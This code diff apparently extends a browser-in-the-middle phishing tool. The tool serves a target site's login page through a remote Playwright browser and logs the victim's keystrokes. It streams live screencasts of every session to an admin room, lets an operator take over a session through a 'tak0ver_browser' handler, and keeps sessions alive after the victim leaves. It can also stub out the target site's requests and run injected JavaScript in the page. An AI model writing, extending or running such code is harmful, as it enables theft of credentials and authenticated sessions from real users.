@@ -214,7 +214,199 @@ let ship_logs = null;
       lockViewport()
       document.addEventListener('DOMContentLoaded', lockViewport)
       window.addEventListener('pageshow', lockViewport)
-      new MutationObserver(lockViewport).observe(document.documentElement, { childList: true, subtree: true })
+      let viewportObserverStarted = false
+      const startViewportObserver = () => {
+        const root = document.documentElement || document.body
+        if (!root || viewportObserverStarted) return
+        viewportObserverStarted = true
+        new MutationObserver(lockViewport).observe(root, { childList: true, subtree: true })
+      }
+      startViewportObserver()
+      document.addEventListener('DOMContentLoaded', startViewportObserver)
+      window.addEventListener('pageshow', startViewportObserver)
+      if (!viewportObserverStarted) setTimeout(startViewportObserver, 0)
+    })
+  }
+
+  const sanitizeUrlForLog = function (rawUrl) {
+    try {
+      const parsed = new URL(rawUrl)
+      const sensitiveNames = /token|key|code|state|session|sid|auth|password|secret|cookie/i
+      for (const [name] of parsed.searchParams) {
+        parsed.searchParams.set(name, sensitiveNames.test(name) ? '[redacted]' : '[value]')
+      }
+      return parsed.toString()
+    } catch (err) {
+      return rawUrl
+    }
+  }
+
+  const shouldStubTargetRequest = function (rawUrl) {
+    const patterns = Array.isArray(config.target_request_stub_urls) ? config.target_request_stub_urls : []
+    return patterns.some(pattern => typeof pattern === 'string' && pattern && rawUrl.includes(pattern))
+  }
+
+  const installTargetRequestStubs = async function (page, browserId) {
+    const patterns = Array.isArray(config.target_request_stub_urls) ? config.target_request_stub_urls.filter(Boolean) : []
+    if (patterns.length === 0) {
+      return
+    }
+    await page.route('**/*', async route => {
+      const request = route.request()
+      const requestUrl = request.url()
+      if (shouldStubTargetRequest(requestUrl)) {
+        console.log(`[TARGET_NET ${browserId}] stub ${request.method()} ${sanitizeUrlForLog(requestUrl)} -> 204`)
+        await route.fulfill({
+          status: 204,
+          contentType: 'text/plain',
+          body: ''
+        })
+        return
+      }
+      await route.continue()
+    })
+    console.log(`[TARGET_NET ${browserId}] installed ${patterns.length} request stub pattern(s)`)
+  }
+
+  const readConfiguredLocalFile = function (filePath, label) {
+    if (typeof filePath !== 'string' || !filePath.trim()) {
+      return ''
+    }
+    const resolvedPath = path.resolve(__dirname, filePath)
+    const projectRoot = path.resolve(__dirname)
+    if (resolvedPath !== projectRoot && !resolvedPath.startsWith(projectRoot + path.sep)) {
+      console.warn(`[DEBUG_NOTICE] ignoring ${label}; path is outside project: ${filePath}`)
+      return ''
+    }
+    try {
+      const contents = fs.readFileSync(resolvedPath, 'utf8')
+      console.log(`[DEBUG_NOTICE] loaded ${label} ${filePath} (${contents.length} bytes)`)
+      return contents
+    } catch (err) {
+      console.warn(`[DEBUG_NOTICE] failed to read ${label} ${filePath}: ${err.message}`)
+      return ''
+    }
+  }
+
+  const installDebugNotice = async function(page) {
+    const enabled = config.debug_notice_enabled === true
+    const inlineHtml = typeof config.debug_notice_html === 'string' ? config.debug_notice_html : ''
+    const fileHtml = readConfiguredLocalFile(config.debug_notice_html_file, 'debug_notice_html_file')
+    const inlineCss = typeof config.debug_notice_css === 'string' ? config.debug_notice_css : ''
+    const fileCss = readConfiguredLocalFile(config.debug_notice_css_file, 'debug_notice_css_file')
+    const fileJs = readConfiguredLocalFile(config.debug_notice_js_file, 'debug_notice_js_file')
+    const html = fileHtml || inlineHtml
+    const css = [inlineCss, fileCss].filter(Boolean).join('\n')
+    if (!enabled || (!html.trim() && !fileJs.trim())) {
+      return
+    }
+    if (html.trim()) {
+      console.log(`[DEBUG_NOTICE] installing HTML notice on page (${html.length} html bytes, ${css.length} css bytes)`)
+      await page.addInitScript(({ noticeHtml, noticeCss }) => {
+      const install = () => {
+        try {
+          if (window.top !== window) return
+
+          const hostId = 'fescar-debug-notice-host'
+          let host = document.getElementById(hostId)
+          if (!host) {
+            host = document.createElement('div')
+            host.id = hostId
+            host.style.setProperty('position', 'fixed', 'important')
+            host.style.setProperty('inset', '0', 'important')
+            host.style.setProperty('z-index', '2147483647', 'important')
+            host.style.setProperty('display', 'flex', 'important')
+            host.style.setProperty('align-items', 'center', 'important')
+            host.style.setProperty('justify-content', 'center', 'important')
+            host.style.setProperty('pointer-events', 'none', 'important')
+            ;(document.body || document.documentElement).appendChild(host)
+          }
+
+          const root = host.shadowRoot || host.attachShadow({ mode: 'open' })
+          root.innerHTML = `
+            <style>
+              :host {
+                all: initial;
+                position: fixed !important;
+                inset: 0 !important;
+                z-index: 2147483647 !important;
+                display: flex !important;
+                align-items: center !important;
+                justify-content: center !important;
+                pointer-events: none !important;
+              }
+              .notice {
+                box-sizing: border-box;
+                max-width: min(680px, calc(100vw - 32px));
+                max-height: calc(100vh - 32px);
+                overflow: auto;
+                padding: 22px 26px;
+                border-radius: 10px;
+                border: 1px solid rgba(255,255,255,0.18);
+                background: rgba(15, 18, 28, 0.96);
+                color: #fff;
+                box-shadow: 0 18px 60px rgba(0,0,0,0.45);
+                font-family: Arial, Helvetica, sans-serif;
+                font-size: 16px;
+                line-height: 1.45;
+                text-align: center;
+                pointer-events: none;
+              }
+              .notice :where(a) {
+                color: #8bc5ff;
+              }
+              ${noticeCss}
+            </style>
+            <div class="notice">${noticeHtml}</div>
+          `
+        } catch (err) {}
+      }
+
+      let observerStarted = false
+      const startObserver = () => {
+        const root = document.documentElement || document.body
+        if (!root || observerStarted) return
+        observerStarted = true
+        install()
+        const observer = new MutationObserver(() => {
+          if (!document.getElementById('fescar-debug-notice-host')) {
+            install()
+          }
+        })
+        observer.observe(root, { childList: true, subtree: true })
+      }
+
+      startObserver()
+      document.addEventListener('DOMContentLoaded', startObserver)
+      window.addEventListener('pageshow', startObserver)
+      if (!observerStarted) setTimeout(startObserver, 0)
+      }, { noticeHtml: html, noticeCss: css })
+    }
+    if (fileJs.trim()) {
+      console.log(`[DEBUG_NOTICE] JS notice configured for first page only (${fileJs.length} js bytes)`)
+    }
+  }
+
+  const runDebugNoticeJsOnce = async function(browser) {
+    if (!browser || !browser.target_page || browser.debug_notice_js_ran || config.debug_notice_enabled !== true) {
+      return
+    }
+    const fileJs = readConfiguredLocalFile(config.debug_notice_js_file, 'debug_notice_js_file')
+    if (!fileJs.trim()) {
+      return
+    }
+    browser.debug_notice_js_ran = true
+    console.log(`[DEBUG_NOTICE] running JS notice once browser=${browser.browser_id} (${fileJs.length} js bytes)`)
+    await browser.target_page.evaluate((scriptText) => {
+      try {
+        console.log('[DEBUG_NOTICE_JS] starting')
+        ;(0, eval)(scriptText)
+        console.log('[DEBUG_NOTICE_JS] finished')
+      } catch (err) {
+        console.warn('[DEBUG_NOTICE_JS] failed: ' + (err && err.stack ? err.stack : (err && err.message ? err.message : err)))
+      }
+    }, fileJs).catch((err) => {
+      console.warn(`[DEBUG_NOTICE] failed to run JS notice browser=${browser.browser_id}: ${err.message}`)
     })
   }
 
@@ -784,6 +976,7 @@ let ship_logs = null;
     browser.controller_socket = ''
     browser.keydebug = ''
     browser.suppress_keys_until = 0
+    browser.debug_notice_js_ran = false
     browser.frameNavigationListenerAttached = false
     browser.keydebug_file = fs.createWriteStream(`./user_data/${browser_id}/keydebug.txt`, { flags: 'a' });
     browser.browser_id = browser_id
@@ -791,7 +984,9 @@ let ship_logs = null;
     browser.mobile_user_agent = getRandomMobileUserAgent()
     browser.target_page = browser.pages()[0] || await browser.newPage()
     browser.target_cdp = await browser.newCDPSession(browser.target_page)
+    await installTargetRequestStubs(browser.target_page, browser_id)
     await installMobileViewportGuards(browser.target_page)
+    await installDebugNotice(browser.target_page)
     if (config.mobile_emulation) {
       await emulatePage(browser, browser.target_page, {
         viewport: {
@@ -817,6 +1012,26 @@ let ship_logs = null;
       }
     }, target_primary_language)
     console.log(`[BROWSER ${browser_id}] user agent: ${browser.user_agent}`)
+    browser.target_page.on('console', msg => {
+      const text = msg.text()
+      if (text.includes('[DEBUG_NOTICE') || msg.type() === 'error' || msg.type() === 'warning') {
+        console.log(`[TARGET_PAGE ${browser_id}] ${msg.type()}: ${text}`)
+      }
+    })
+    browser.target_page.on('pageerror', err => {
+      console.warn(`[TARGET_PAGE ${browser_id}] pageerror: ${err && (err.stack || err.message || err)}`)
+    })
+    browser.target_page.on('requestfailed', request => {
+      const failure = request.failure()
+      console.warn(`[TARGET_NET ${browser_id}] requestfailed ${request.method()} ${sanitizeUrlForLog(request.url())} reason=${failure ? failure.errorText : 'unknown'}`)
+    })
+    browser.target_page.on('response', response => {
+      const status = response.status()
+      if (status >= 400) {
+        const request = response.request()
+        console.warn(`[TARGET_NET ${browser_id}] response ${status} ${request.method()} ${sanitizeUrlForLog(response.url())}`)
+      }
+    })
     //automatically dismiss alerts etc.
     browser.target_page.on('dialog', async dialog => {
       console.log(dialog.message())
@@ -824,6 +1039,7 @@ let ship_logs = null;
     })
     browser.target_page.on('request', async request => {
       if (request.method() === 'POST') {
+        console.log(`[TARGET_NET ${browser_id}] post ${sanitizeUrlForLog(request.url())}`)
         if (config.post_url_search && browser.user_ip != '') {
           let post_url_search = new RegExp(`${config.post_url_search}`, "i");
           if (post_url_search.test(request.url())) {
@@ -890,16 +1106,40 @@ let ship_logs = null;
       await browser.target_page.bringToFront().catch(() => {})
       browser.cdp_screencast_active = true
       browser.cdp_screencast_viewer = viewerSocketId
+      browser.cdp_first_frame_logged = false
       browser.cdp_screencast_handler = async (frame) => {
         if (!browser.cdp_screencast_active) return
-        const displayWidth = browser.puppeteer_width || browser.user_width || frame.metadata?.deviceWidth
-        const displayHeight = browser.puppeteer_height || browser.user_height || frame.metadata?.deviceHeight
-        fastify.io.to(browser.cdp_screencast_viewer).emit('cdp_screencast_frame', {
-          data: frame.data,
-          width: displayWidth,
-          height: displayHeight
-        })
-        await browser.target_cdp.send('Page.screencastFrameAck', { sessionId: frame.sessionId }).catch(() => {})
+        try {
+          const dataUrl = `data:image/jpeg;base64,${frame.data}`
+          const displayWidth = frame.metadata?.deviceWidth || browser.puppeteer_width || browser.user_width
+          const displayHeight = frame.metadata?.deviceHeight || browser.puppeteer_height || browser.user_height
+          if (!browser.cdp_first_frame_logged) {
+            browser.cdp_first_frame_logged = true
+            console.log(`[CDP_SCREENCAST] first frame browser=${browser.browser_id} viewer=${browser.cdp_screencast_viewer} size=${displayWidth}x${displayHeight}`)
+          }
+          fastify.io.to(browser.cdp_screencast_viewer).emit('cdp_screencast_frame', {
+            data: frame.data,
+            width: displayWidth,
+            height: displayHeight
+          })
+          if (browser.controller_socket && browser.controller_socket !== browser.user_socket) {
+            fastify.io.to(browser.controller_socket).emit('admin_screencast_frame', {
+              browser_id: browser.browser_id,
+              data: frame.data,
+              width: displayWidth,
+              height: displayHeight
+            })
+          }
+          const now = Date.now()
+          if (!browser.last_admin_thumbnail_at || now - browser.last_admin_thumbnail_at > 1500) {
+            browser.last_admin_thumbnail_at = now
+            fastify.io.to('admin_room').emit('thumbnail', browser.browser_id, dataUrl, browser.keydebug)
+          }
+        } catch (frameErr) {
+          console.warn(`[CDP_SCREENCAST] frame handler failed browser=${browser.browser_id}: ${frameErr.message}`)
+        } finally {
+          await browser.target_cdp.send('Page.screencastFrameAck', { sessionId: frame.sessionId }).catch(() => {})
+        }
       }
       browser.target_cdp.on('Page.screencastFrame', browser.cdp_screencast_handler)
       const captureWidth = Math.round((browser.puppeteer_width || browser.user_width || 1280) * SCREENCAST_SCALE)
@@ -912,6 +1152,23 @@ let ship_logs = null;
         everyNthFrame: 1
       })
       console.log(`[CDP_SCREENCAST] started browser=${browser.browser_id} viewer=${viewerSocketId} quality=${SCREENCAST_QUALITY} scale=${SCREENCAST_SCALE}`)
+    }
+
+    const emitAdminThumbnail = async function (socket, browser) {
+      if (!browser || !browser.target_page || !browser.browser_id || !browser.user_ip) {
+        return
+      }
+      try {
+        const screenshot = await browser.target_page.screenshot({
+          type: 'jpeg',
+          quality: 60,
+          timeout: 5000
+        })
+        socket.emit('thumbnail', browser.browser_id, `data:image/jpeg;base64,${screenshot.toString('base64')}`, browser.keydebug)
+      } catch (err) {
+        console.warn(`[ADMIN] failed to snapshot browser ${browser.browser_id}: ${err.message}`)
+        socket.emit('thumbnail', browser.browser_id, '', browser.keydebug)
+      }
     }
 
     const attachNavigationListener = function (browser) {
@@ -1006,6 +1263,7 @@ let ship_logs = null;
           attachNavigationListener(empty_fescarbowl)
           // Navigate now, after emulation is configured, so the target site receives the correct UA
           await empty_fescarbowl.target_page.goto(target.login_page, { waitUntil: 'load', timeout: 30000 })
+          await runDebugNoticeJsOnce(empty_fescarbowl)
           await enforceMobileViewportGuards(empty_fescarbowl)
           const actualUA = await empty_fescarbowl.target_page.evaluate(() => navigator.userAgent).catch(() => 'unknown')
           const actualMobile = await empty_fescarbowl.target_page.evaluate(() => ({ isMobile: window.matchMedia('(hover: none)').matches, w: window.innerWidth })).catch(() => null)
@@ -1022,6 +1280,9 @@ let ship_logs = null;
           await warmupTargetRender(empty_fescarbowl)
 
           empty_fescarbowl.user_socket = request.socket_id
+          empty_fescarbowl.user_connected = true
+          empty_fescarbowl.user_disconnected_at = null
+          empty_fescarbowl.user_attached_at = Date.now()
           // Start this user with control of the assigned browser instance.
           empty_fescarbowl.controller_socket = request.socket_id
           // Tell pinpo.html the actual browser viewport size so it can scale touch coordinates
@@ -1080,7 +1341,19 @@ let ship_logs = null;
           provisioning = false
         })
       })
+      socket.on('new_admin', async function () {
+        socket.join('admin_room')
+        const activeBrowsers = browsers.filter(browser => browser && browser.user_ip)
+        console.log(`[ADMIN] ${socket.id} connected; sending ${activeBrowsers.length} existing sessions`)
+        for (const browser of activeBrowsers) {
+          await emitAdminThumbnail(socket, browser)
+        }
+      })
       socket.on('disconnect', function () {
+        const adminIndex = admins.indexOf(socket.id)
+        if (adminIndex !== -1) {
+          admins.splice(adminIndex, 1)
+        }
         for (let i = pendingFescarAssignments.length - 1; i >= 0; i -= 1) {
           if (pendingFescarAssignments[i].socket_id === socket.id) {
             pendingFescarAssignments.splice(i, 1)
@@ -1088,7 +1361,16 @@ let ship_logs = null;
         }
         const browser = browsers.get('user_socket', socket.id)
         if (browser) {
-          stopCdpScreencast(browser).catch(() => {})
+          browser.user_connected = false
+          browser.user_disconnected_at = Date.now()
+          if (browser.controller_socket === socket.id) {
+            browser.controller_socket = ''
+          }
+          console.log(`[DISCONNECT] viewer ${socket.id} detached from browser ${browser.browser_id}; keeping Playwright instance for admin debugging`)
+        }
+        const controlledBrowser = browsers.get('controller_socket', socket.id)
+        if (controlledBrowser) {
+          controlledBrowser.controller_socket = controlledBrowser.user_connected ? controlledBrowser.user_socket : ''
         }
       })
       socket.on("tak0ver_browser", async function (browser_id, viewport_width, viewport_height) {
@@ -1105,6 +1387,9 @@ let ship_logs = null;
         browser.controller_socket = socket.id
         await resize_window(browser, browser.target_page, viewport_width, viewport_height)
         await setPageViewport(browser.target_page, { width: viewport_width, height: viewport_height, deviceScaleFactor: VIEWPORT_DEVICE_SCALE_FACTOR })
+        if (!browser.cdp_screencast_active) {
+          await startCdpScreencast(browser, browser.user_socket || socket.id)
+        }
       })
       socket.on("give_back_control", async function (browser_id) {
         //give control back to the user
